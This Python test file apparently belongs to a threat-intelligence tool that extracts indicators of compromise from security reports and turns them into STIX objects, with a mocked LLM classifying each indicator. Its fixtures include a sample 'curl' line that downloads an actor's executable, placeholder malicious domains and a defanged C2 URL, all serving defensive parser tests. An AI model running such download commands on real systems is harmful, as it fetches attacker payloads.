"""Tests de l'extraction d'IOC (règles, éléments, étape LLM avec faux modèle, objets STIX) : `uv run python -m unittest tests.test_iocs -v`."""

import json
import unittest
from datetime import datetime, timezone
from unittest import mock

import stix2

from backend.extracting import iocs as ex
from backend.extracting.segment import segment
from backend.database.stix_store import to_neo4j_properties
from backend.stix.iocs import IocFinding, build_ioc_objects, observable, pattern, without_benign
from backend.stix.objects import TLP_WHITE, ArticleContext, as_dict, bundle, deterministic_id, report

PUBLISHED = datetime(2026, 4, 22, tzinfo=timezone.utc)
SHA256 = "0123456789abcdef" * 4
MD5 = "0123456789abcdef" * 2
SHA1 = "0123456789abcdef0123456789abcdef01234567"
QAKBOT = deterministic_id("malware", name="qakbot")
APT29 = deterministic_id("intrusion-set", name="apt29")
INCIDENT = deterministic_id("incident", name="intrusionreport")
ACME = deterministic_id("identity", identity_class="organization", name="acme")


def find(markdown, **kw):
    cands, dropped = ex.find_iocs(segment(markdown), publishers=kw.pop("publishers", frozenset({"thedfirreport.com"})), published=kw.pop("published", PUBLISHED))
    return {(c.kind, c.value): c for c in cands}, {(d.kind, d.value): d.reason for d in dropped}


class Rules(unittest.TestCase):
    def test_public_addresses_kept_private_reserved_and_versions_dropped(self):
        found, dropped = find("The operator used 8.8.4.4 and 192.168.1.10 and 10.0.0.5. Chrome/118.0.0.0 and version 1.2.3.4 were seen.")
        self.assertEqual([v for k, v in found if k == "ipv4-addr"], ["8.8.4.4"])
        self.assertEqual(dropped[("ipv4-addr", "192.168.1.10")], "private-or-reserved")
        self.assertEqual(dropped[("ipv4-addr", "118.0.0.0")], "version-like")
        self.assertEqual(dropped[("ipv4-addr", "1.2.3.4")], "version-like")

    def test_domains_need_a_real_tld_and_are_not_file_names_or_sentence_joins(self):
        found, dropped = find("The loader contacted evil-cdn.xyz after cmd.exe ran. It saved update.py and wrote notes.Then it stopped. Contact example.com.")
        self.assertEqual([v for k, v in found if k == "domain-name"], ["evil-cdn.xyz"])
        self.assertEqual(dropped[("domain-name", "update.py")], "file-name-or-ambiguous")  # .py est un TLD réel (Paraguay)
        self.assertEqual(dropped[("domain-name", "example.com")], "documentation")
        self.assertNotIn(("domain-name", "notes.then"), found)  # « notes.Then » : espace oubliée

    def test_ambiguous_tld_is_a_domain_only_in_an_indicator_section(self):
        found, _ = find("## Network indicators\n\n- install.sh\n- evil.zip\n")
        self.assertIn(("domain-name", "install.sh"), found)

    def test_popular_domain_is_not_an_ioc_but_its_subdomain_goes_to_the_model(self):
        found, dropped = find("Traffic to google.com was normal, but login.google.com was impersonated by evil.google.com.")
        self.assertEqual(dropped[("domain-name", "google.com")], "popular-domain")
        self.assertTrue(found[("domain-name", "evil.google.com")].popular_subdomain)

    def test_publisher_is_never_an_ioc(self):
        _, dropped = find("Read https://thedfirreport.com/2026/x and write to press@thedfirreport.com or visit thedfirreport.com.")
        self.assertEqual({d for d in dropped.values()}, {"publisher", "publisher-or-documentation"})

    def test_urls(self):
        found, dropped = find(
            "See [the report](https://github.com/org/report) for context. The payload came from https://raw.githubusercontent.com/x/y/main/a.exe today. "
            "Rules: https://github.com/org/rules/blob/main/win.yar. Malformed http://[bad/ stays harmless."
        )
        self.assertIn(("url", "https://raw.githubusercontent.com/x/y/main/a.exe"), found)
        self.assertEqual(dropped[("url", "https://github.com/org/report")], "reference-link")
        self.assertEqual(dropped[("url", "https://github.com/org/rules/blob/main/win.yar")], "detection-rule-or-document")

    def test_hashes_algorithms_and_rejections(self):
        md5, sha1, sha256 = MD5, SHA1, SHA256
        found, dropped = find(f"Samples: {md5}, {sha1}, {sha256}. Not a hash: {'1' * 32} and {'a' * 32}.")
        self.assertEqual({k[1]: v.algo for k, v in found.items() if k[0] == "file"}, {md5: "MD5", sha1: "SHA-1", sha256: "SHA-256"})
        self.assertEqual(len([d for d in dropped.values() if d == "not-a-hash"]), 2)

    def test_tls_and_certificate_fingerprints_are_not_file_hashes(self):
        md5b, sha1b = "72a589da586844d7f0818ce684948eea", "4a42b5e7e7fd43ddefc856f45bb95d97656ddca6"
        found, dropped = find(f"## Cobalt Strike\n\n    59.95.98.204\n    JA3: {md5b}\n    JA3S: {MD5}\n    Thumbprint: {sha1b}\n    Sample: {SHA256}\n")
        self.assertEqual({k[1] for k in found if k[0] == "file"}, {SHA256})
        self.assertEqual({dropped[("file", h)] for h in (md5b, MD5, sha1b)}, {"tls-or-certificate-fingerprint"})
        self.assertIn(("ipv4-addr", "59.95.98.204"), found)
        table = f"## Network\n\n| Hash | Type | Malware |\n| --- | --- | --- |\n| **{md5b}** | JA3 | Cobalt Strike |\n| {SHA256} | SHA-256 | Cobalt Strike |\n"
        found, dropped = find(table)
        self.assertEqual(dropped[("file", md5b)], "tls-or-certificate-fingerprint")  # étiquette après la valeur
        self.assertIn(("file", SHA256), found)

    def test_social_links_quoted_citations_and_code_repositories(self):
        quote = "> IOC's<https://t.co/tZgoqOU6Ox> pic.twitter.com/GfRXjO1GF8 and https://twitter.com/x/status/1 and evil-gate.xyz\n> — someone (@x) May 18, 2022\n"
        found, dropped = find(quote)
        self.assertEqual(dropped[("url", "https://t.co/tZgoqOU6Ox")], "social-media-link")
        self.assertEqual(dropped[("domain-name", "pic.twitter.com")], "social-media-link")
        self.assertEqual(dropped[("url", "https://twitter.com/x/status/1")], "quoted-citation")
        self.assertIn(("domain-name", "evil-gate.xyz"), found)  # un domaine inconnu cité dans un tweet reste un IOC
        code = "## Execution\n\n    git clone https://github.com/actor/tool\n    curl https://github.com/actor/tool/releases/download/v1/a.exe\n"
        found, dropped = find(code)
        self.assertEqual(dropped[("url", "https://github.com/actor/tool")], "code-repository-reference")
        self.assertIn(("url", "https://github.com/actor/tool/releases/download/v1/a.exe"), found)
        found, _ = find("## Indicators\n\n    https://github.com/actor/tool\n")
        self.assertIn(("url", "https://github.com/actor/tool"), found)  # dans une liste d'indicateurs : l'auteur le désigne

    def test_hashes_of_one_file_form_one_candidate_with_its_name(self):
        md5b, sha1b, sha256b = "27d0b9e38cdc9a31fa9271c0bbf5d393", "e96980812c287c9d27be9181bcf08727cc9f457a", "1b9c9e4ed6dab822b36e3716b1e8f046e92546554dff9bdbd18c822e18ab226b"
        markdown = (
            f"# Report\n\nThe beacon {sha256b} was copied over SMB.\n\n## Indicators\n\n#### File:\n\n"
            f"    info_1805.xls\n    {MD5}\n    {SHA1}\n    {SHA256}\n\n    1.dll\n    {md5b}\n    {sha1b}\n    {sha256b}\n"
        )
        found, _ = find(markdown)
        files = {c.name: c for c in found.values() if c.kind == "file"}
        self.assertEqual(set(files), {"info_1805.xls", "1.dll"})
        self.assertEqual(files["info_1805.xls"].hashes, {"MD5": MD5, "SHA-1": SHA1, "SHA-256": SHA256})
        self.assertEqual((files["1.dll"].value, files["1.dll"].algo), (sha256b, "SHA-256"))  # valeur affichée : le hachage le plus fort
        self.assertEqual(len(files["1.dll"].uids), 2)  # le hachage cité dans le récit est le même fichier
        self.assertTrue(files["1.dll"].record.startswith("1.dll " + md5b))
        # sans ligne vide entre deux fichiers, le nom suivant ouvre un nouvel enregistrement
        found, _ = find(f"## Indicators\n\n    a.exe\n    {MD5}\n    {SHA256}\n    b.dll\n    {md5b}\n    {sha256b}\n")
        self.assertEqual({c.name for c in found.values() if c.kind == "file"}, {"a.exe", "b.dll"})
        # un algorithme répété : plusieurs fichiers, un par hachage
        found, _ = find(f"## Indicators\n\n    {MD5}\n    {md5b}\n")
        self.assertEqual(len([c for c in found.values() if c.kind == "file"]), 2)

    def test_refanging_and_detection_rules_are_not_ioc_lists(self):
        found, _ = find("The sample beaconed to hxxps://evil[.]example[.]org/gate.php daily.")
        self.assertIn(("url", "https://evil.example.org/gate.php"), found)
        yara = "## Detection\n\n```\nrule X {\n  strings:\n    $a = \"evil-domain.xyz\"\n  condition:\n    any of them\n}\n```\n"
        self.assertEqual(find(yara)[0], {})  # le contenu d'une règle YARA est de la détection, pas un IOC

    def test_dedup_keeps_every_citing_unit(self):
        found, _ = find("The server 8.8.4.4 was the C2. Later 8.8.4.4 received the stolen data.")
        self.assertEqual(len(found[("ipv4-addr", "8.8.4.4")].uids), 2)

    def test_explicit_date_only_when_unique_and_plausible(self):
        self.assertEqual(find("On 2026-04-18 the actor used 8.8.4.4.")[0][("ipv4-addr", "8.8.4.4")].observed, datetime(2026, 4, 18, tzinfo=timezone.utc))
        self.assertIsNone(find("From 2026-04-10 to 2026-04-18 the actor used 8.8.4.4.")[0][("ipv4-addr", "8.8.4.4")].observed)
        self.assertIsNone(find("On 2026-09-01 the actor used 8.8.4.4.")[0][("ipv4-addr", "8.8.4.4")].observed)  # postérieure à l'article
        self.assertIsNone(find("In March 2010, April 3, 2010 the actor used 8.8.4.4.")[0][("ipv4-addr", "8.8.4.4")].observed)  # trop ancienne : référence historique


ENTITIES = [
    {"id": QAKBOT, "type": "malware", "name": "Qakbot"},
    {"id": APT29, "type": "intrusion-set", "name": "APT29", "aliases": ["Cozy Bear"]},
    {"id": INCIDENT, "type": "incident", "name": "Intrusion report"},
    {"id": ACME, "type": "identity", "name": "ACME"},
]
ARTICLE = """# Report

Qakbot used 8.8.4.4 for command and control. The loader also called evil-cdn.xyz, 9.9.9.10 and others.

## Network indicators

- 20.20.20.20
- 21.21.21.21
- 22.22.22.22

## Files

Qakbot samples: """ + SHA256 + "\n"


def fake_generate(answers, calls=None):
    def generate(system, prompt, schema, **kw):
        if calls is not None:
            calls.append((prompt, schema))
        return mock.Mock(parsed={"answers": answers}, prompt_tokens=1, output_tokens=1, seconds=0.0, tokens_per_second=0.0)

    return generate


class Stage(unittest.TestCase):
    def units(self):
        return segment(ARTICLE)

    def test_items_group_by_sentence_or_section_and_propose_mentioned_entities(self):
        att = ex.attachables(ENTITIES)
        cands, _ = ex.find_iocs(self.units(), published=PUBLISHED)
        items = ex.build_items(cands, self.units(), att)
        names = lambda it: {a.name for a in att if a.eid in it.attach_ids}  # noqa: E731
        sentence = next(i for i in items if any(c.value == "8.8.4.4" for c in i.cands))
        self.assertEqual(len(sentence.cands), 1)  # une phrase, ≤ 4 IOC : un élément par IOC
        self.assertEqual(names(sentence), {"Qakbot", "Intrusion report"})  # entité mentionnée + incident
        annex = next(i for i in items if any(c.value == "20.20.20.20" for c in i.cands))
        self.assertEqual(len(annex.cands), 3)  # une section d'annexe : un seul élément
        self.assertTrue(any(i.family == "file" for i in items))

    def test_each_announced_block_and_each_named_file_is_its_own_item(self):
        markdown = (
            "# Report\n\nCobalt Strike was staged by Qakbot. They ran AdFind using a batch file named find.bat.\n\n"
            "## Indicators\n\n#### Network:\n\nCobalt Strike:\n\n    59.95.98.204:8080\n\nQakbot:\n\n    103.8.26.17:8080\n    134.122.119.23:8080\n\n"
            f"#### File:\n\n    find.bat\n    {MD5}\n    {SHA256}\n"
        )
        entities = ENTITIES + [{"id": "tool--cs", "type": "tool", "name": "Cobalt Strike"}, {"id": "tool--af", "type": "tool", "name": "AdFind"}]
        att = ex.attachables(entities)
        units = segment(markdown)
        cands, _ = ex.find_iocs(units, published=PUBLISHED)
        items = ex.build_items(cands, units, att)
        names = lambda it: {a.name for a in att if a.eid in it.attach_ids}  # noqa: E731
        by_value = {c.value: it for it in items for c in it.cands}
        self.assertIsNot(by_value["59.95.98.204"], by_value["103.8.26.17"])  # deux blocs annoncés : deux rattachements possibles
        self.assertEqual(by_value["59.95.98.204"].context, "Cobalt Strike:")
        self.assertEqual(names(by_value["59.95.98.204"]), {"Cobalt Strike", "Intrusion report"})
        self.assertEqual(names(by_value["103.8.26.17"]), {"Qakbot", "Intrusion report"})
        batch = by_value[SHA256]
        self.assertIn("find.bat", batch.context)  # la phrase du récit qui nomme le fichier
        self.assertEqual(names(batch), {"Cobalt Strike", "Qakbot", "AdFind", "Intrusion report"})  # phrase et phrase précédente
        titled = segment("# Qakbot Report\n\n## Execution\n\nThey ran AdFind using find.bat.\n\n## Indicators\n\n" + f"    find.bat\n    {MD5}\n\n" + "## Files\n\n" + f"    {SHA1}\n")
        cands, _ = ex.find_iocs(titled, published=PUBLISHED)
        by_value = {c.value: it for it in ex.build_items(cands, titled, att) for c in it.cands}
        self.assertEqual(names(by_value[MD5]), {"AdFind", "Intrusion report"})  # le titre ne s'ajoute pas à un sujet plus proche
        self.assertEqual(names(by_value[SHA1]), {"Qakbot", "Intrusion report"})  # rien de plus proche : le sujet du titre
        self.assertIn("find.bat (" + SHA256 + ")", ex.ioc_user("Report", [batch], att))

    def test_answers_resolve_role_attachment_confidence_and_quote(self):
        att = {a.name: a.eid for a in ex.attachables(ENTITIES)}
        with mock.patch.object(ex.llm, "generate") as gen:
            def answer(system, prompt, schema, **kw):
                rows = []
                for line in prompt.splitlines():
                    if line.startswith("["):
                        index = line[1 : line.index("]")]
                        if "8.8.4.4" in line:
                            rows.append({"item": index, "role": "c2", "to": att["Qakbot"]})
                        elif "evil-cdn.xyz" in line or "9.9.9.10" in line:
                            rows.append({"item": index, "role": "not-malicious", "to": "none"})
                        elif "hachages" in line:
                            rows.append({"item": index, "role": "c2", "to": att["Qakbot"]})  # un fichier ne peut pas être un C2
                        else:
                            rows.append({"item": index, "role": "payload-delivery", "to": "none"})
                return mock.Mock(parsed={"answers": rows}, prompt_tokens=1, output_tokens=1, seconds=0.0, tokens_per_second=0.0)

            gen.side_effect = answer
            res = ex.extract_iocs("Report", self.units(), ENTITIES, published=PUBLISHED)
        by = {f.value: f for f in res.findings}
        self.assertEqual((by["8.8.4.4"].role, by["8.8.4.4"].attach_name, by["8.8.4.4"].confidence), ("c2", "Qakbot", 75))
        self.assertIn("command and control", by["8.8.4.4"].quote)
        self.assertEqual((by["evil-cdn.xyz"].role, by["evil-cdn.xyz"].attach_id), ("not-malicious", None))  # jugé non malveillant : gardé pour l'audit, sans rattachement
        self.assertEqual(res.n_not_malicious, 2)
        self.assertNotIn("judged-not-malicious", {d.reason for d in res.dropped})
        self.assertEqual((by["20.20.20.20"].role, by["20.20.20.20"].attach_name), ("payload-delivery", "Intrusion report"))  # « none » : l'intrusion décrite
        self.assertEqual(by["20.20.20.20"].confidence, 55)
        self.assertEqual(by[SHA256].role, "malware-sample")

    def test_unanswered_or_invalid_items_stay_unknown_and_unattached(self):
        with mock.patch.object(ex.llm, "generate", fake_generate([{"item": "99", "role": "c2", "to": "E1"}, {"item": "1", "role": "bogus", "to": "E1"}])):
            res = ex.extract_iocs("Report", self.units(), ENTITIES, published=PUBLISHED)
        self.assertTrue(res.findings and all(f.role == "unknown" and f.attach_id is None and f.confidence == 35 for f in res.findings))

    def test_entity_not_proposed_for_the_item_is_ignored(self):
        with mock.patch.object(ex.llm, "generate", fake_generate([{"item": "1", "role": "c2", "to": "E2"}])):
            res = ex.extract_iocs("Report", self.units(), ENTITIES, published=PUBLISHED)
        first = res.findings[0]
        self.assertNotEqual(first.attach_name, "APT29")  # APT29 n'est mentionné nulle part près de cet élément

    def test_schema_only_admits_this_calls_items_and_entities(self):
        calls = []
        with mock.patch.object(ex.llm, "generate", fake_generate([], calls)):
            ex.extract_iocs("Report", self.units(), ENTITIES, published=PUBLISHED)
        schema = calls[0][1]["properties"]["answers"]["items"]["properties"]
        self.assertEqual(set(schema["role"]["enum"]), set(ex.ROLES))
        self.assertIn("none", schema["to"]["enum"])
        self.assertNotIn("E2", schema["to"]["enum"])  # APT29 n'est proposé à aucun élément : absent de l'enum


class Objects(unittest.TestCase):
    def build(self, findings=None, source_id=5, site="x", published=PUBLISHED):
        """Objets `stix2` des IOC d'un article, l'éditeur et le `Report` qui les liste."""
        ctx = ArticleContext(source_id, site, "https://x.org/a", "Report", now=PUBLISHED)
        objs = [ctx.publisher, *build_ioc_objects(self.findings() if findings is None else findings, ctx, published)]
        return [report(ctx, "Report", published, [o["id"] for o in objs if o["id"] != ctx.publisher.id]), *objs]

    def findings(self):
        return [
            IocFinding("ipv4-addr", "8.8.4.4", None, "c2", "C2 at 8.8.4.4", attach_id=QAKBOT, attach_type="malware", attach_name="Qakbot", confidence=75),
            IocFinding("file", SHA256, "SHA-256", "malware-sample", "sample", attach_id=QAKBOT, attach_type="malware"),
            IocFinding("domain-name", "bad.example.org", None, "not-malicious", "legit"),
            IocFinding("email-addr", "a@b.org", None, "phishing", "mail", attach_id=APT29, attach_type="intrusion-set", attach_name="APT29"),
        ]

    @staticmethod
    def reparse(objects):
        return stix2.parse(bundle(objects).serialize(), allow_custom=False)  # relu par stix2 en mode strict

    def test_bundle_is_strict_stix_and_report_lists_the_ioc_objects(self):
        objects = self.build()
        self.reparse(objects)
        rep = next(o for o in objects if o["type"] == "report")
        self.assertTrue({o["id"] for o in objects if o["type"] in ("indicator", "sighting", "ipv4-addr", "file")} <= set(rep["object_refs"]))
        self.assertTrue(all(isinstance(o, stix2.base._STIXBase) for o in objects))  # objets stix2, pas des dictionnaires

    def test_model_indicator_observable_sighting_infrastructure(self):
        objects = self.build()
        by_type = lambda t: [o for o in objects if o["type"] == t]  # noqa: E731
        self.assertEqual(len(by_type("indicator")), 4)
        ip = next(o for o in by_type("ipv4-addr"))
        self.assertEqual(ip["id"], stix2.IPv4Address(value="8.8.4.4").id)  # identifiant défini par la norme
        infra = {o["name"]: o for o in by_type("infrastructure")}
        self.assertEqual(infra["Command-and-control infrastructure — Qakbot"]["infrastructure_types"], ["command-and-control"])
        rels = {(r["relationship_type"], r["source_ref"], r["target_ref"]) for r in by_type("relationship")}
        cc = infra["Command-and-control infrastructure — Qakbot"]["id"]
        self.assertIn(("uses", QAKBOT, cc), rels)
        self.assertIn(("consists-of", cc, ip["id"]), rels)
        self.assertTrue(any(r[0] == "indicates" and r[2] == cc for r in rels))
        self.assertTrue(any(r[0] == "indicates" and r[2] == QAKBOT for r in rels))  # le hachage désigne le malware
        self.assertTrue(any(r[0] == "based-on" for r in rels))

    def test_sighting_is_dated_by_the_article_or_the_explicit_date_and_never_invented(self):
        sightings = [o for o in self.build() if o["type"] == "sighting"]
        self.assertTrue(all(s["first_seen"] == s["last_seen"] == PUBLISHED for s in sightings))
        dated = self.findings()[:1]
        dated[0].observed = datetime(2026, 4, 18, tzinfo=timezone.utc)
        self.assertEqual([o["first_seen"] for o in self.build(dated) if o["type"] == "sighting"], [datetime(2026, 4, 18, tzinfo=timezone.utc)])
        undated = self.build(published=None)
        self.assertEqual([o for o in undated if o["type"] == "sighting"], [])  # date inconnue : pas d'observation, donc statut « inconnu »
        self.reparse(undated)

    def test_not_malicious_is_a_benign_indicator_without_relation_to_the_attack(self):
        objects = self.build()
        benign = next(o for o in objects if o["type"] == "indicator" and o["name"] == "bad.example.org")
        self.assertEqual((benign["indicator_types"], benign["labels"]), (["benign"], ["not-malicious"]))
        rels = [o for o in objects if o["type"] == "relationship" and benign["id"] in (o["source_ref"], o["target_ref"])]
        self.assertEqual([r["relationship_type"] for r in rels], ["based-on"])  # ni indicates, ni infrastructure
        self.assertFalse(any("bad.example.org" in o.get("name", "") for o in objects if o["type"] == "infrastructure"))

    def test_without_benign_removes_the_benign_ioc_and_nothing_else(self):
        objects = self.build()[1:]  # sans le report : l'appelant le recrée sur ce qui reste
        kept = without_benign(objects)
        self.assertNotIn("bad.example.org", json.dumps([as_dict(o) for o in kept]))
        self.assertEqual(len(kept), len(objects) - 4)  # indicateur, observation, based-on, observable
        malicious_only = self.build(self.findings()[:2])[1:]
        self.assertEqual(without_benign(malicious_only), malicious_only)  # rien de bénin : rien ne change

    def test_two_articles_citing_the_same_ioc_get_two_sightings_and_one_indicator(self):
        a = self.build()
        b = self.build(source_id=6, site="y", published=datetime(2026, 6, 1, tzinfo=timezone.utc))
        ind = lambda objs: {o["id"] for o in objs if o["type"] == "indicator"}  # noqa: E731
        self.assertEqual(ind(a), ind(b))
        self.assertTrue({o["id"] for o in a if o["type"] == "sighting"}.isdisjoint({o["id"] for o in b if o["type"] == "sighting"}))

    def test_ids_are_deterministic(self):
        self.assertEqual([o["id"] for o in self.build()], [o["id"] for o in self.build()])

    def test_patterns_are_built_by_stix2_and_neo4j_flattens_file_hashes(self):
        self.assertEqual(pattern(IocFinding("url", "http://x/a'b", None, "c2", "q")), "[url:value = 'http://x/a\\'b']")
        flat = to_neo4j_properties(as_dict(observable(self.findings()[1], [TLP_WHITE.id])))
        self.assertEqual((flat["value"], flat["hash_algo"]), (SHA256, "SHA-256"))
        self.assertNotIsInstance(flat.get("hashes"), dict)  # Neo4j n'accepte pas de map

    def test_a_file_with_several_hashes_is_one_observable_and_one_indicator(self):
        f = IocFinding("file", SHA256, "SHA-256", "malware-sample", "1.dll …", hashes={"SHA-256": SHA256, "MD5": MD5, "SHA-1": SHA1}, name="1.dll", attach_id=QAKBOT, attach_type="malware")
        self.assertEqual(pattern(f), f"[file:hashes.MD5 = '{MD5}' OR file:hashes.'SHA-1' = '{SHA1}' OR file:hashes.'SHA-256' = '{SHA256}']")
        objects = self.build([f])
        self.reparse(objects)
        (sco,) = [o for o in objects if o["type"] == "file"]
        self.assertEqual((sco["name"], set(sco["hashes"])), ("1.dll", {"MD5", "SHA-1", "SHA-256"}))
        self.assertEqual(len([o for o in objects if o["type"] == "indicator"]), 1)
        # l'ordre d'arrivée des hachages ne change pas l'indicateur
        g = IocFinding("file", SHA256, "SHA-256", "malware-sample", "q", hashes={"MD5": MD5, "SHA-256": SHA256, "SHA-1": SHA1})
        self.assertEqual(pattern(f), pattern(g))

    def test_unattached_network_ioc_still_gets_an_infrastructure(self):
        objs = self.build([IocFinding("ipv4-addr", "8.8.4.4", None, "exfiltration", "q")])
        self.assertEqual([o["name"] for o in objs if o["type"] == "infrastructure"], ["Exfiltration infrastructure"])

    def test_invalid_hash_is_refused_by_stix2(self):
        with self.assertRaises(stix2.exceptions.InvalidValueError):
            self.build([IocFinding("file", "zz", "SHA-256", "malware-sample", "q")])


if __name__ == "__main__":
    unittest.main()
